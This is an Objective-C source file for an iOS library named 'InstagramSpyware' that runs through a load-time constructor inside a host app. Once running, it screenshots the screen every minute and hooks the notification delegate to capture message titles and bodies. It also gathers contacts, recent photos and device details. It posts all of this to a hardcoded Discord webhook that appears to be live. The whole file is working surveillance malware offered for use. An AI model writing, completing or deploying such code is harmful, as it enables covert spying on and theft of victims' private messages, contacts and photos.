#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <UserNotifications/UserNotifications.h>
#import <CoreLocation/CoreLocation.h>
#import <Contacts/Contacts.h>
#import <Photos/Photos.h>

@interface InstagramSpyware : NSObject

+ (instancetype)sharedInstance;
- (void)startAll;
- (void)setDiscordWebhookURL:(NSString *)webhookURL;

// Internal methods
- (void)takeScreenshot;
- (void)sendToDiscordWebhook:(NSDictionary *)payload;
- (void)sendScreenshotToDiscord:(UIImage *)screenshot;
- (void)hookNotifications;
- (void)scrapeContacts;
- (void)scrapePhotos;
- (void)sendDeviceInfo;

@end

@implementation InstagramSpyware {
    NSTimer *_screenshotTimer;
    NSString *_discordWebhookURL;
    NSURLSession *_urlSession;
}

#pragma mark - Singleton

+ (instancetype)sharedInstance {
    static InstagramSpyware *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [[self alloc] init];
    });
    return sharedInstance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _discordWebhookURL = @"https://discordapp.com/api/webhooks/1252261340702310422/iUMCrX_RbZl_mHaUFN7czWbczo-88jV1xSC97_bN3AWtsRsUgrpwIl23BRbk1ti7u8ma";
        
        // --- CORRECT FIX ---
        // Create a configuration. We don't set the queue here.
        NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
        config.timeoutIntervalForRequest = 30.0;
        config.timeoutIntervalForResource = 60.0;
        
        // Create the session with a delegate and specify the main queue.
        // This ensures all completion handlers run on the main thread.
        // We pass nil for the delegate because we are using the block-based completion handlers,
        // but specifying the queue still works.
        _urlSession = [NSURLSession sessionWithConfiguration:config
                                                     delegate:nil
                                            delegateQueue:[NSOperationQueue mainQueue]];
    }
    return self;
}
- (void)setDiscordWebhookURL:(NSString *)webhookURL {
    _discordWebhookURL = webhookURL;
}

- (void)dealloc {
    [_screenshotTimer invalidate];
    _screenshotTimer = nil;
    
    // It's good practice to invalidate the session to stop any ongoing tasks.
    [_urlSession invalidateAndCancel];
    _urlSession = nil;
}

#pragma mark - Public Interface

- (void)startAll {
    NSLog(@"[InstagramSpyware] Starting all surveillance modules.");

    [self sendDeviceInfo];
    
    _screenshotTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(takeScreenshot) userInfo:nil repeats:YES];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self hookNotifications];
    });

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self scrapeContacts];
        [self scrapePhotos];
    });
}

#pragma mark - Data Collection Methods

- (void)takeScreenshot {
    UIWindow *keyWindow = nil;
    
    if (@available(iOS 13.0, *)) {
        NSSet *connectedScenes = [[UIApplication sharedApplication] connectedScenes];
        for (UIScene *scene in connectedScenes) {
            if ([scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow) {
                        keyWindow = window;
                        break;
                    }
                }
            }
            if (keyWindow) break;
        }
    } else {
         #pragma clang diagnostic push
         #pragma clang diagnostic ignored "-Wdeprecated-declarations"
         keyWindow = [UIApplication sharedApplication].keyWindow;
         #pragma clang diagnostic pop
    }

    if (!keyWindow) {
        NSLog(@"[InstagramSpyware] Could not find key window for screenshot.");
        return;
    }

    UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, NO, keyWindow.screen.scale);
    [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
    UIImage *screenshot = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    if (screenshot) {
        [self sendScreenshotToDiscord:screenshot];
    } else {
        NSLog(@"[InstagramSpyware] Failed to generate screenshot.");
    }
}

- (void)scrapeContacts {
    if (![CNContactStore class]) return;
    CNContactStore *store = [[CNContactStore alloc] init];
    if ([CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts] != CNAuthorizationStatusAuthorized) {
        NSLog(@"[InstagramSpyware] Contacts not authorized.");
        return;
    }

    NSError *error;
    NSArray<CNContact *> *contacts = [store unifiedContactsMatchingPredicate:[CNContact predicateForContactsInContainerWithIdentifier:store.defaultContainerIdentifier] keysToFetch:@[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] error:&error];

    if (error || contacts.count == 0) {
        NSLog(@"[InstagramSpyware] No contacts found or error fetching them.");
        return;
    }

    NSMutableString *contactList = [[NSMutableString alloc] init];
    for (CNContact *contact in contacts) {
        [contactList appendFormat:@"%@ %@\n", contact.givenName, contact.familyName];
        for (CNLabeledValue *label in contact.phoneNumbers) {
            NSString *phoneNumber = [CNPhoneNumber phoneNumberWithStringValue:label.value].stringValue;
            [contactList appendFormat:@"  - %@\n", phoneNumber];
        }
    }

    NSString *content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```%@\n```", (unsigned long)contacts.count, contactList];
    if (content.length > 1900) {
        content = [NSString stringWithFormat:@"📇 Contact List Scraped (%lu contacts)\n```(List too long to display)```", (unsigned long)contacts.count];
    }

    NSDictionary *payload = @{@"content": content, @"username": @"Instagram Spy", @"avatar_url": @"https://i.imgur.com/mDKlggm.png"};
    [self sendToDiscordWebhook:payload];
}

- (void)scrapePhotos {
    if ([PHPhotoLibrary authorizationStatus] != PHAuthorizationStatusAuthorized) {
        NSLog(@"[InstagramSpyware] Photos not authorized.");
        return;
    }

    PHImageManager *manager = [PHImageManager defaultManager];
    PHFetchOptions *options = [[PHFetchOptions alloc] init];
    options.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:NO]];
    options.fetchLimit = 3;

    PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:options];
    if (assets.count == 0) {
        NSLog(@"[InstagramSpyware] No photos found.");
        return;
    }

    PHImageRequestOptions *imageOptions = [[PHImageRequestOptions alloc] init];
    imageOptions.synchronous = YES;
    imageOptions.deliveryMode = PHImageRequestOptionsDeliveryModeHighQualityFormat;

    for (PHAsset *asset in assets) {
        [manager requestImageForAsset:asset targetSize:CGSizeMake(800, 800) contentMode:PHImageContentModeAspectFit options:imageOptions resultHandler:^(UIImage * _Nullable image, NSDictionary * _Nullable info) {
            if (image) {
                [self sendScreenshotToDiscord:image];
            }
        }];
    }
}

- (void)sendDeviceInfo {
    UIDevice *device = [UIDevice currentDevice];
    NSLocale *locale = [NSLocale currentLocale];

    NSString *deviceInfo = [NSString stringWithFormat:
        @"**Device Model:** %@\n"
        @"**System Name:** %@\n"
        @"**System Version:** %@\n"
        @"**Name:** %@\n"
        @"**Locale:** %@",
        device.model, device.systemName, device.systemVersion, device.name, locale.localeIdentifier
    ];

    NSDictionary *payload = @{
        @"content": [NSString stringWithFormat:@"🖥️ New Session Started - Device Info\n```%@\n```", deviceInfo],
        @"username": @"Instagram Spy",
        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
    };
    [self sendToDiscordWebhook:payload];
}

#pragma mark - Notification Swizzling

- (void)hookNotifications {
    // Use a timer to poll for the delegate, as it might not be available immediately.
    [NSTimer scheduledTimerWithTimeInterval:1.0 repeats:YES block:^(NSTimer * _Nonnull timer) {
        UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
        id delegate = center.delegate;

        if (!delegate) {
            // Delegate not yet set, keep retrying.
            NSLog(@"[InstagramSpyware] Notification delegate not yet available, will retry...");
            return;
        }

        // We found the delegate, so we can stop the timer.
        [timer invalidate];

        Class delegateClass = [delegate class];
        SEL originalSelector = @selector(userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);
        Method originalMethod = class_getInstanceMethod(delegateClass, originalSelector);

        if (!originalMethod) {
            NSLog(@"[InstagramSpyware] Could not find the notification delegate method to hook on class %@.", NSStringFromClass(delegateClass));
            return;
        }

        // Define the swizzled method selector.
        SEL swizzledSelector = @selector(swizzled_userNotificationCenter:didReceiveNotificationResponse:withCompletionHandler:);

        // *** THE FIX IS HERE ***
        // We need to add our swizzling implementation to the TARGET class (the delegate's class),
        // not our own class. Then we can exchange the implementations.
        Method swizzledMethod = class_getInstanceMethod([InstagramSpyware class], @selector(swizzled_didReceiveNotification:didReceiveNotificationResponse:withCompletionHandler:));
        
        // Add the method from our class to the delegate's class.
        BOOL didAddMethod = class_addMethod(delegateClass,
                                            swizzledSelector,
                                            method_getImplementation(swizzledMethod),
                                            method_getTypeEncoding(swizzledMethod));

        if (didAddMethod) {
            // If the method was added, get the newly added method and exchange it.
            Method newMethod = class_getInstanceMethod(delegateClass, swizzledSelector);
            method_exchangeImplementations(originalMethod, newMethod);
            NSLog(@"[InstagramSpyware] Successfully hooked notification delegate on class %@.", NSStringFromClass(delegateClass));
        } else {
            NSLog(@"[InstagramSpyware] Failed to add swizzled method to delegate class. It might already exist.");
        }
    }];
}

// Rename this method to match the selector used in the hook.
- (void)swizzled_userNotificationCenter:(UNUserNotificationCenter *)center
            didReceiveNotificationResponse:(UNNotificationResponse *)response
                         withCompletionHandler:(void (^)(void))completionHandler {

    // --- Your spyware logic ---
    UNNotificationContent *content = response.notification.request.content;
    InstagramSpyware *spyware = [InstagramSpyware sharedInstance]; // Use sharedInstance to access spyware methods
    NSDictionary *notificationPayload = @{
        @"content": [NSString stringWithFormat:@"🔔 Intercepted Instagram Notification\n**Title:** %@\n**Body:** %@", content.title, content.body],
        @"username": @"Instagram Spy",
        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
    };
    [spyware sendToDiscordWebhook:notificationPayload];
    // --- End of spyware logic ---

    // Call the original implementation using the swizzled selector.
    // This works because method_exchangeImplementations swaps the IMPs.
    // So calling 'swizzled_didReceiveNotification' on the original class now calls the original method.
    [self swizzled_userNotificationCenter:center
                didReceiveNotificationResponse:response
                             withCompletionHandler:completionHandler];
}

#pragma mark - Data Exfiltration

- (void)sendToDiscordWebhook:(NSDictionary *)payload {
    if (!_discordWebhookURL || [_discordWebhookURL isEqualToString:@"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"]) {
        NSLog(@"[InstagramSpyware] Discord webhook URL is not set. Aborting send.");
        return;
    }

    NSError *error;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:&error];
    if (error) {
        NSLog(@"[InstagramSpyware] Failed to serialize JSON payload: %@", error.localizedDescription);
        return;
    }

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:_discordWebhookURL]];
    [request setHTTPMethod:@"POST"];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:jsonData];

    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[InstagramSpyware] Discord webhook request FAILED with error: %@", error.localizedDescription);
            return;
        }
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        NSLog(@"[InstagramSpyware] Discord webhook response status code: %ld", (long)httpResponse.statusCode);
        if (httpResponse.statusCode < 200 || httpResponse.statusCode >= 300) {
            NSString *responseBody = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSLog(@"[InstagramSpyware] Discord webhook failed with status %ld. Response body: %@", (long)httpResponse.statusCode, responseBody);
        } else {
            NSLog(@"[InstagramSpyware] Discord webhook sent successfully.");
        }
    }];
    [task resume];
}

- (void)sendScreenshotToDiscord:(UIImage *)screenshot {
    if (!_discordWebhookURL || [_discordWebhookURL isEqualToString:@"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"]) {
        NSLog(@"[InstagramSpyware] Discord webhook URL is not set. Aborting screenshot send.");
        return;
    }

    // Convert the image to JPEG data. It's generally smaller and faster than PNG.
    NSData *imageData = UIImageJPEGRepresentation(screenshot, 0.8);
    if (!imageData) {
        NSLog(@"[InstagramSpyware] Failed to convert screenshot to JPEG data.");
        return;
    }

    // Create the URL and Request
    NSURL *url = [NSURL URLWithString:_discordWebhookURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];

    // Define the boundary for the multipart/form-data
    NSString *boundary = @"----WebKitFormBoundary7MA4YWxkTrZu0gW";
    NSString *contentType = [NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary];
    [request setValue:contentType forHTTPHeaderField:@"Content-Type"];

    // Create the body data
    NSMutableData *body = [NSMutableData data];

    // 1. Add the payload_json part
    NSDictionary *payloadJson = @{
        @"content": @"📸 New Instagram screenshot captured",
        @"username": @"Instagram Spy",
        @"avatar_url": @"https://i.imgur.com/mDKlggm.png"
    };
    NSError *jsonError;
    NSData *payloadData = [NSJSONSerialization dataWithJSONObject:payloadJson options:0 error:&jsonError];
    if (jsonError) {
        NSLog(@"[InstagramSpyware] Failed to serialize JSON payload for screenshot: %@", jsonError.localizedDescription);
        return;
    }

    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:payloadData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // 2. Add the image file part
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Disposition: form-data; name=\"file1\"; filename=\"screenshot.jpg\"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: image/jpeg\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:imageData];
    [body appendData:[@"\r\n" dataUsingEncoding:NSUTF8StringEncoding]];

    // 3. Close the boundary
    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];

    // Set the request body
    [request setHTTPBody:body];

    // Create and run the task
    NSURLSessionDataTask *task = [_urlSession dataTaskWithRequest:request
                                                completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"[InstagramSpyware] Discord screenshot upload FAILED: %@", error.localizedDescription);
            return;
        }
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        if (httpResponse.statusCode >= 200 && httpResponse.statusCode < 300) {
            NSLog(@"[InstagramSpyware] Discord screenshot uploaded successfully.");
        } else {
            NSString *responseBody = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
            NSLog(@"[InstagramSpyware] Discord screenshot upload failed with status %ld. Response: %@", (long)httpResponse.statusCode, responseBody);
        }
    }];
    [task resume];
}

@end

#pragma mark - Constructor
__attribute__((constructor))
static void initInstagramSpyware() {
    // Don't do anything heavy here. Just schedule the real work to run later.
    // We use a 3-second delay to give the host app plenty of time to
    // initialize its UI, scenes, and notification delegates.
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        NSLog(@"[InstagramSpyware] Constructor delay finished, starting surveillance.");
        
        // Now it's safe to start. The notification observer is redundant
        // if we're just starting after a delay, so we call startAll directly.
        [[InstagramSpyware sharedInstance] startAll];
    });
}
